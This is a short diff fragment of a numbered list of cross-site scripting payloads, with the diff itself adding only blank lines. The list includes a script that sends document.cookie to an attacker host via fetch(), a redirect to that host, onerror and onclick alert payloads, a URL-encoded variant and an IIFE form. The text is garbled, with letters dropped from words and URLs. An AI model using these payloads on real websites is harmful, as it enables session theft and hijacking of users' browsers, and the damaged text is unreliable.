@@ -5,14 +5,23 @@
 1. Stealing Cookies: 
 <script>fetch('h p://a acker.com/log?cookie=' + document.cookie);</script> 
 2. Redirec ng the User: 
+
 <script>window.loca on='h p://a acker.com'</script> 
+
 3. Bypassing Filters (using encoded characters): 
+
 <img src=x onerror=alert('XSS')> 
+
 Or encoded version: 
+
 %3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E 
+
 4. Using an Event Handler: 
+
 <a href="#" onclick="alert('XSS')">Click me!</a> 
+
 5. Advanced Payload (using IIFE): 
+
 <script>(()=>{alert('XSS')})()</script> 
 
 ----
